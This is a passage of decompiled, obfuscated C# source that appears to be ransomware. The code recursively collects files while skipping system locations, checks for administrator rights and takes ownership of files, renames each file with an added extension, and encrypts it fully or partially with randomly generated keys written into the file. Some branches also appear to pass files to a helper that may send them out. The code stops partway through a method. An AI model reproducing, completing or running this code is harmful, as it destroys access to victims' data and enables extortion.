using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using eyWttysFpUD;

namespace VyjVuXvolaw;

internal sealed class CRZFkRWzfSXjW
{
	public sealed class xNoMbXrswm
	{
		private static StringCollection duezrzzCaPuEQa;

		private static List<string> vYkjRQYmIPdlVQA;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107403734));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107403761)) && !text.ToLower().Contains(getString_0(107403708)) && !text.ToLower().Contains(getString_0(107388736)) && !text.ToLower().Contains(getString_0(107388755)) && !text.ToLower().Contains(getString_0(107403727)) && !text.ToLower().Contains(getString_0(107388575)) && !text.ToLower().Contains(getString_0(107389028)) && !text.ToLower().Contains(getString_0(107389043)) && !text.ToLower().Contains(getString_0(107388994)) && !text.ToLower().Contains(getString_0(107389009)) && !text.ToLower().Contains(getString_0(107388975)) && !text.ToLower().Contains(getString_0(107388926)) && !text.ToLower().Contains(getString_0(107388941)) && !text.ToLower().Contains(getString_0(107388896)) && !text.ToLower().Contains(getString_0(107388907)) && !text.ToLower().Contains(getString_0(107388862)) && !text.ToLower().Contains(getString_0(107388881)) && !text.ToLower().Contains(getString_0(107388832)) && !text.ToLower().Contains(getString_0(107388847)) && !text.Contains(wcGmwtolXpKf(getString_0(107388798))) && !text.Contains(getString_0(107388261)) && !text.Contains(getString_0(107388248)) && !text.EndsWith(getString_0(107396044)) && !text.EndsWith(getString_0(107388223)) && !text.EndsWith(getString_0(107388218)) && !text.EndsWith(getString_0(107388245)) && !text.EndsWith(getString_0(107388240)) && !text.ToLower().Contains(getString_0(107388235)) && !text.ToLower().Contains(NnEdFRIdEjUNKn))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(xtbYgrRCEXRhIt) * 1024.0 * 1024.0 && VIsIdhZRykLqTUQDB == getString_0(107396856))
							{
								vYkjRQYmIPdlVQA.Add(text);
							}
							else if (File.Exists(text) && VIsIdhZRykLqTUQDB == getString_0(107397113))
							{
								vYkjRQYmIPdlVQA.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return vYkjRQYmIPdlVQA;
		}

		static xNoMbXrswm()
		{
			Strings.CreateGetStringDelegate(typeof(xNoMbXrswm));
			duezrzzCaPuEQa = new StringCollection();
			vYkjRQYmIPdlVQA = new List<string>();
		}
	}

	private sealed class RiPRfhSjod
	{
		public string RUNABRXajzYGN;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == RUNABRXajzYGN;
		}
	}

	private sealed class nIgmNIXelPinh
	{
		public string LpqzqekLavlGf;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__18(int int_0)
		{
			Thread.Sleep(rqDMxhDDSWkTsJ);
			jwBOsivrxmQ.Add(getString_0(107388136) + LpqzqekLavlGf + getString_0(107396781) + (char)int_0 + getString_0(107403681));
			try
			{
				if (RiGciHwEXLcD)
				{
					Console.WriteLine(getString_0(107388136) + LpqzqekLavlGf + getString_0(107396781) + (char)int_0 + getString_0(107403681));
				}
			}
			catch
			{
			}
		}

		static nIgmNIXelPinh()
		{
			Strings.CreateGetStringDelegate(typeof(nIgmNIXelPinh));
		}
	}

	private sealed class vOHOsvLviLQqmJ
	{
		private sealed class ZJQRQbsKlksRfB
		{
			public vOHOsvLviLQqmJ BNdekvQMINxw;

			public string sQzjrqksarliXmnhP;

			public void _003CCrypt_003Eb__24()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					rXfHCYqjpT(WindowsIdentity.GetCurrent().Name, sQzjrqksarliXmnhP);
				}
			}

			public void _003CCrypt_003Eb__25()
			{
				OsuwEthgRZZacQeE(sQzjrqksarliXmnhP, BNdekvQMINxw.kBxPEhJgsWQ, BNdekvQMINxw.HFAvvYnqToNmgO, BNdekvQMINxw.FNoMAhwXyXFqhpl, BNdekvQMINxw.NcdJFcIQTBnl);
			}
		}

		public string[] kBxPEhJgsWQ;

		public string[] FNoMAhwXyXFqhpl;

		public string NcdJFcIQTBnl;

		public string HFAvvYnqToNmgO;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__23(string string_0)
		{
			ZJQRQbsKlksRfB CS_0024_003C_003E8__locals0 = new ZJQRQbsKlksRfB();
			CS_0024_003C_003E8__locals0.BNdekvQMINxw = this;
			CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP = string_0;
			if (kwebbXGLWFTcp && !fSJKiQHscLg().Contains(getString_0(107386039)) && !fSJKiQHscLg().Contains(getString_0(107403681)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						rXfHCYqjpT(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (PEOsufOVorqNP == getString_0(107396864))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					OsuwEthgRZZacQeE(CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP, CS_0024_003C_003E8__locals0.BNdekvQMINxw.kBxPEhJgsWQ, CS_0024_003C_003E8__locals0.BNdekvQMINxw.HFAvvYnqToNmgO, CS_0024_003C_003E8__locals0.BNdekvQMINxw.FNoMAhwXyXFqhpl, CS_0024_003C_003E8__locals0.BNdekvQMINxw.NcdJFcIQTBnl);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				OsuwEthgRZZacQeE(CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP, kBxPEhJgsWQ, HFAvvYnqToNmgO, FNoMAhwXyXFqhpl, NcdJFcIQTBnl);
			}
		}

		static vOHOsvLviLQqmJ()
		{
			Strings.CreateGetStringDelegate(typeof(vOHOsvLviLQqmJ));
		}
	}

	private sealed class FxgjJBeAgKI
	{
		private sealed class RbxrafgBfeI
		{
			public FxgjJBeAgKI ERbidYCXnsIaqN;

			public string BDZCAuBdihSBznm;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__31()
			{
				foreach (string item in sAdxWTwIriShHsff)
				{
					if (BDZCAuBdihSBznm.ToLower().EndsWith(item + ERbidYCXnsIaqN.utySFCfMcfJj) && YzEXDgkVctSKX == getString_0(107396875))
					{
						if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > new FileInfo(BDZCAuBdihSBznm).Length)
						{
							try
							{
								ZAUYlWQzUcjJsT.miCKLJJWpcWV(getString_0(107389204), getString_0(107389199), getString_0(107389218), BDZCAuBdihSBznm);
							}
							catch
							{
							}
						}
					}
					else if (BDZCAuBdihSBznm.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107397132))
					{
						try
						{
							ZAUYlWQzUcjJsT.miCKLJJWpcWV(getString_0(107389204), getString_0(107389199), getString_0(107389218), BDZCAuBdihSBznm);
						}
						catch
						{
						}
					}
				}
			}

			static RbxrafgBfeI()
			{
				Strings.CreateGetStringDelegate(typeof(RbxrafgBfeI));
			}
		}

		private sealed class nENfISsEyyx
		{
			public FxgjJBeAgKI ERbidYCXnsIaqN;

			public string qyZDUzTWNklpNg;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__33()
			{
				foreach (string item in sAdxWTwIriShHsff)
				{
					if (qyZDUzTWNklpNg.ToLower().EndsWith(item + ERbidYCXnsIaqN.utySFCfMcfJj) && YzEXDgkVctSKX == getString_0(107396878))
					{
						if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > new FileInfo(qyZDUzTWNklpNg).Length)
						{
							try
							{
								ZAUYlWQzUcjJsT.miCKLJJWpcWV(getString_0(107389207), getString_0(107389202), getString_0(107389221), qyZDUzTWNklpNg);
							}
							catch
							{
							}
						}
					}
					else if (qyZDUzTWNklpNg.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107397135))
					{
						try
						{
							ZAUYlWQzUcjJsT.miCKLJJWpcWV(getString_0(107389207), getString_0(107389202), getString_0(107389221), qyZDUzTWNklpNg);
						}
						catch
						{
						}
					}
				}
			}

			static nENfISsEyyx()
			{
				Strings.CreateGetStringDelegate(typeof(nENfISsEyyx));
			}
		}

		public List<string> wyBNNoIkpYPp;

		public List<string> UWBePPalaohE;

		public string utySFCfMcfJj;

		public string[] nwbGeFCbtFNo;

		public string pPYjMJSGlCKrKN;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__30(string string_0)
		{
			RbxrafgBfeI CS_0024_003C_003E8__locals0;
			foreach (string item in UWBePPalaohE)
			{
				if (nwbGeFCbtFNo.Length != 0)
				{
					string[] array = nwbGeFCbtFNo;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0a4a;
					}
				}
				try
				{
					if (item.EndsWith(utySFCfMcfJj))
					{
						goto IL_0a4a;
					}
				}
				catch (Exception)
				{
					goto IL_0a4a;
				}
				if (!item.EndsWith(string_0) || ngVLNnblfHHw.Contains(item))
				{
					continue;
				}
				if (hbiMFBxXkVIgur == getString_0(107396872))
				{
					try
					{
						if (bDLavqCifRg.hgwUYErfUfmB(item))
						{
							bDLavqCifRg.ZVBSVVwZBOSjy(item);
						}
					}
					catch
					{
					}
				}
				ngVLNnblfHHw.Add(item);
				if (!CyfMkozTWVl.Contains(Path.GetDirectoryName(item)))
				{
					CyfMkozTWVl.Add(Path.GetDirectoryName(item));
				}
				MpaCfTRkZWHvoHNT(item);
				try
				{
					new mbfZkiAFZEWw().cXstDkUvoPpm(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (RiGciHwEXLcD)
							{
								Console.WriteLine(getString_0(107403708) + item + getString_0(107403119) + new FileInfo(item).Length + getString_0(107403130));
								Console.WriteLine(getString_0(107403089));
							}
						}
						catch
						{
						}
						ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107402984)), getString_0(107388135) + item + getString_0(107388135) + wcGmwtolXpKf(getString_0(107402959)) + getString_0(107388135) + Environment.UserName + getString_0(107388135) + wcGmwtolXpKf(getString_0(107402974)));
					}
				}
				catch (Exception ex2)
				{
					if (VLajbDNhoSbf)
					{
						try
						{
							File.AppendAllText(MGkBzYPheHDPb, getString_0(107386181) + item + getString_0(107402949) + ex2.Message + getString_0(107396343));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (VLajbDNhoSbf)
						{
							try
							{
								File.AppendAllText(MGkBzYPheHDPb, getString_0(107386181) + item + getString_0(107403348) + ex4.Message + getString_0(107396343));
							}
							catch (Exception)
							{
							}
						}
						uAQgXZmBeIANml++;
						goto end_IL_02cd;
					}
					if (DuwAfCYTUCT == getString_0(107396872) && new FileInfo(item).Length > Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024 && !wyBNNoIkpYPp.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new RbxrafgBfeI();
						CS_0024_003C_003E8__locals0.ERbidYCXnsIaqN = this;
						try
						{
							if (utySFCfMcfJj != getString_0(107386432))
							{
								if (vzooNONBAAoJ)
								{
									utySFCfMcfJj = zwSwCGajjNfu + utySFCfMcfJj;
								}
								File.Move(item, item + utySFCfMcfJj);
							}
						}
						catch (Exception ex6)
						{
							if (VLajbDNhoSbf)
							{
								try
								{
									File.AppendAllText(MGkBzYPheHDPb, getString_0(107386181) + item + getString_0(107403319) + ex6.Message + getString_0(107396343));
								}
								catch (Exception)
								{
								}
							}
							uAQgXZmBeIANml++;
							goto end_IL_02cd;
						}
						CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm = getString_0(107389152);
						if (utySFCfMcfJj != getString_0(107386432))
						{
							CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm = item + utySFCfMcfJj;
						}
						else
						{
							CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm = item;
						}
						if (SFDpinVUmMSqKHuE == getString_0(107396872))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in sAdxWTwIriShHsff)
								{
									if (CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.ERbidYCXnsIaqN.utySFCfMcfJj) && YzEXDgkVctSKX == RbxrafgBfeI.getString_0(107396875))
									{
										if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm).Length)
										{
											try
											{
												ZAUYlWQzUcjJsT.miCKLJJWpcWV(RbxrafgBfeI.getString_0(107389204), RbxrafgBfeI.getString_0(107389199), RbxrafgBfeI.getString_0(107389218), CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm.ToLower().EndsWith(item2) && YzEXDgkVctSKX == RbxrafgBfeI.getString_0(107397132))
									{
										try
										{
											ZAUYlWQzUcjJsT.miCKLJJWpcWV(RbxrafgBfeI.getString_0(107389204), RbxrafgBfeI.getString_0(107389199), RbxrafgBfeI.getString_0(107389218), CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = xgcaYSxbaKKYuMD.WocDKMFkPpSXo(32);
						string text2 = getString_0(107389152);
						text2 = (AcumuDDlRST ? xgcaYSxbaKKYuMD.YKhjYVOWMHQY() : getString_0(107389152));
						string s = FNswwgGAUxLCaAC.ahNxsEtgrSV(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (QYWNitRbofuBkTAcs == getString_0(107397129))
						{
							byte[] array2 = null;
							byte[] byte_ = ZequaDafYiEEE.OYFCIPVseFW(CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm, Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024);
							if (ZequaDafYiEEE.CBMnRUrBOXPu(KnotHgwphVB: (!rqILzTAnaGs) ? (AcumuDDlRST ? ZequaDafYiEEE.HmKdoaYIxt(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ZequaDafYiEEE.HmKdoaYIxt(byte_, Convert.FromBase64String(pPYjMJSGlCKrKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (AcumuDDlRST ? GYrgigmSJl.YnZehuQLJizp(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : GYrgigmSJl.YnZehuQLJizp(byte_, Convert.FromBase64String(pPYjMJSGlCKrKN), Convert.FromBase64String(MLaZeafODt))), rLBaDxrvUPxawf: CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm, bZjXaGuPypAlc: bytes))
							{
								goto IL_0a4a;
							}
							try
							{
								File.Move(item + utySFCfMcfJj, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!AcumuDDlRST)
						{
							if (HZTGcNttCaj.lqncezAjKg(CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm, SHZkgBAmdkcxAL, pPYjMJSGlCKrKN, null, Convert.FromBase64String(MLaZeafODt)))
							{
								goto IL_0a4a;
							}
							try
							{
								File.Move(item + utySFCfMcfJj, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (HZTGcNttCaj.lqncezAjKg(CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm, SHZkgBAmdkcxAL, text, bytes, Convert.FromBase64String(text2)))
							{
								goto IL_0a4a;
							}
							try
							{
								File.Move(item + utySFCfMcfJj, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (vzooNONBAAoJ)
					{
						utySFCfMcfJj = zwSwCGajjNfu + utySFCfMcfJj;
					}
					string text3 = xgcaYSxbaKKYuMD.WocDKMFkPpSXo(32);
					string text4 = getString_0(107389152);
					text4 = (AcumuDDlRST ? xgcaYSxbaKKYuMD.YKhjYVOWMHQY() : getString_0(107389152));
					string s2 = FNswwgGAUxLCaAC.ahNxsEtgrSV(text3 + text4);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (utySFCfMcfJj != getString_0(107386432))
					{
						if (!qtSCtAyEKwnBa)
						{
							if (!AcumuDDlRST)
							{
								MDGJMFjWgcsbCsl(item, item + utySFCfMcfJj, oybyixAEyQBUaM);
							}
							else
							{
								MDGJMFjWgcsbCsl(item, item + utySFCfMcfJj, Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!AcumuDDlRST)
								{
									chNSgfSgFKJs(item, item + utySFCfMcfJj, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
								}
								else
								{
									chNSgfSgFKJs(item, item + utySFCfMcfJj, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex11)
							{
								if (VLajbDNhoSbf)
								{
									try
									{
										File.AppendAllText(MGkBzYPheHDPb, getString_0(107386181) + item + getString_0(107386386) + ex11.Message + getString_0(107396343));
									}
									catch (Exception)
									{
									}
								}
								uAQgXZmBeIANml++;
								try
								{
									File.Move(item + utySFCfMcfJj, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_02cd;
							}
						}
					}
					else if (!qtSCtAyEKwnBa)
					{
						if (!AcumuDDlRST)
						{
							MDGJMFjWgcsbCsl(item, item + getString_0(107386427), oybyixAEyQBUaM);
						}
						else
						{
							MDGJMFjWgcsbCsl(item, item + getString_0(107386427), Convert.FromBase64String(text3));
						}
					}
					else
					{
						try
						{
							if (!AcumuDDlRST)
							{
								chNSgfSgFKJs(item, item, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
							}
							else
							{
								chNSgfSgFKJs(item, item, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
							}
						}
						catch (Exception ex14)
						{
							if (VLajbDNhoSbf)
							{
								try
								{
									File.AppendAllText(MGkBzYPheHDPb, getString_0(107386181) + item + getString_0(107386386) + ex14.Message + getString_0(107396343));
								}
								catch (Exception)
								{
								}
							}
							uAQgXZmBeIANml++;
							goto end_IL_02cd;
						}
					}
					if (AcumuDDlRST)
					{
						if (utySFCfMcfJj != getString_0(107386432))
						{
							hOfBAzalVlDAWcj(item + utySFCfMcfJj, bytes2);
						}
						else
						{
							hOfBAzalVlDAWcj(item, bytes2);
						}
					}
					goto IL_0a4a;
					end_IL_02cd:;
				}
				catch (Exception)
				{
					goto IL_0a4a;
				}
				continue;
				IL_0a4a:
				UWBePPalaohE.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__32(string string_0)
		{
			nENfISsEyyx CS_0024_003C_003E8__locals0 = new nENfISsEyyx();
			CS_0024_003C_003E8__locals0.ERbidYCXnsIaqN = this;
			CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg = string_0;
			if (nwbGeFCbtFNo.Length != 0)
			{
				string[] array = nwbGeFCbtFNo;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0b2a;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.EndsWith(utySFCfMcfJj))
				{
					goto IL_0b2a;
				}
			}
			catch (Exception)
			{
				goto IL_0b2a;
			}
			if (!ngVLNnblfHHw.Contains(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg))
			{
				if (hbiMFBxXkVIgur == getString_0(107396872))
				{
					try
					{
						if (bDLavqCifRg.hgwUYErfUfmB(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg))
						{
							bDLavqCifRg.ZVBSVVwZBOSjy(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
						}
					}
					catch
					{
					}
				}
				ngVLNnblfHHw.Add(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
				if (!CyfMkozTWVl.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg)))
				{
					CyfMkozTWVl.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg));
				}
				MpaCfTRkZWHvoHNT(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
				try
				{
					new mbfZkiAFZEWw().cXstDkUvoPpm(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (RiGciHwEXLcD)
							{
								Console.WriteLine(getString_0(107403708) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107403119) + new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length + getString_0(107403130));
								Console.WriteLine(getString_0(107403089));
							}
						}
						catch
						{
						}
						ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107402984)), getString_0(107388135) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107388135) + wcGmwtolXpKf(getString_0(107402959)) + getString_0(107388135) + Environment.UserName + getString_0(107388135) + wcGmwtolXpKf(getString_0(107402974)));
					}
				}
				catch (Exception ex2)
				{
					if (VLajbDNhoSbf)
					{
						try
						{
							File.AppendAllText(MGkBzYPheHDPb, getString_0(107386181) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107402949) + ex2.Message + getString_0(107396343));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (VLajbDNhoSbf)
						{
							try
							{
								File.AppendAllText(MGkBzYPheHDPb, getString_0(107386181) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107403348) + ex4.Message + getString_0(107396343));
							}
							catch (Exception)
							{
							}
						}
						uAQgXZmBeIANml++;
						goto end_IL_031d_2;
					}
					if (DuwAfCYTUCT == getString_0(107396872) && new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length > Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024)
					{
						try
						{
							if (utySFCfMcfJj != getString_0(107386432))
							{
								if (vzooNONBAAoJ)
								{
									utySFCfMcfJj = zwSwCGajjNfu + utySFCfMcfJj;
								}
								File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj);
							}
						}
						catch (Exception ex6)
						{
							if (VLajbDNhoSbf)
							{
								try
								{
									File.AppendAllText(MGkBzYPheHDPb, getString_0(107386181) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107403319) + ex6.Message + getString_0(107396343));
								}
								catch (Exception)
								{
								}
							}
							uAQgXZmBeIANml++;
							return;
						}
						if (utySFCfMcfJj != getString_0(107386432))
						{
							CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg += utySFCfMcfJj;
						}
						if (SFDpinVUmMSqKHuE == getString_0(107396872))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in sAdxWTwIriShHsff)
								{
									if (CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.ERbidYCXnsIaqN.utySFCfMcfJj) && YzEXDgkVctSKX == nENfISsEyyx.getString_0(107396878))
									{
										if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length)
										{
											try
											{
												ZAUYlWQzUcjJsT.miCKLJJWpcWV(nENfISsEyyx.getString_0(107389207), nENfISsEyyx.getString_0(107389202), nENfISsEyyx.getString_0(107389221), CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.ToLower().EndsWith(item) && YzEXDgkVctSKX == nENfISsEyyx.getString_0(107397135))
									{
										try
										{
											ZAUYlWQzUcjJsT.miCKLJJWpcWV(nENfISsEyyx.getString_0(107389207), nENfISsEyyx.getString_0(107389202), nENfISsEyyx.getString_0(107389221), CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = xgcaYSxbaKKYuMD.WocDKMFkPpSXo(32);
						string text2 = getString_0(107389152);
						text2 = (AcumuDDlRST ? xgcaYSxbaKKYuMD.YKhjYVOWMHQY() : getString_0(107389152));
						string s = FNswwgGAUxLCaAC.ahNxsEtgrSV(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (QYWNitRbofuBkTAcs == getString_0(107397129))
						{
							byte[] array2 = null;
							byte[] byte_ = ZequaDafYiEEE.OYFCIPVseFW(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024);
							if (!ZequaDafYiEEE.CBMnRUrBOXPu(KnotHgwphVB: (!rqILzTAnaGs) ? (AcumuDDlRST ? ZequaDafYiEEE.HmKdoaYIxt(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ZequaDafYiEEE.HmKdoaYIxt(byte_, Convert.FromBase64String(pPYjMJSGlCKrKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (AcumuDDlRST ? GYrgigmSJl.YnZehuQLJizp(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : GYrgigmSJl.YnZehuQLJizp(byte_, Convert.FromBase64String(pPYjMJSGlCKrKN), Convert.FromBase64String(MLaZeafODt))), rLBaDxrvUPxawf: CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, bZjXaGuPypAlc: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!AcumuDDlRST)
						{
							if (!HZTGcNttCaj.lqncezAjKg(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, SHZkgBAmdkcxAL, pPYjMJSGlCKrKN, null, Convert.FromBase64String(MLaZeafODt)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!HZTGcNttCaj.lqncezAjKg(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, SHZkgBAmdkcxAL, text, bytes, Convert.FromBase64String(text2)))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (vzooNONBAAoJ)
						{
							utySFCfMcfJj = zwSwCGajjNfu + utySFCfMcfJj;
						}
						string text3 = xgcaYSxbaKKYuMD.WocDKMFkPpSXo(32);
						string text4 = getString_0(107389152);
						text4 = (AcumuDDlRST ? xgcaYSxbaKKYuMD.YKhjYVOWMHQY() : getString_0(107389152));
						string s2 = FNswwgGAUxLCaAC.ahNxsEtgrSV(text3 + text4);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (utySFCfMcfJj != getString_0(107386432))
						{
							if (!qtSCtAyEKwnBa)
							{
								if (!AcumuDDlRST)
								{
									MDGJMFjWgcsbCsl(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, oybyixAEyQBUaM);
								}
								else
								{
									MDGJMFjWgcsbCsl(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!AcumuDDlRST)
									{
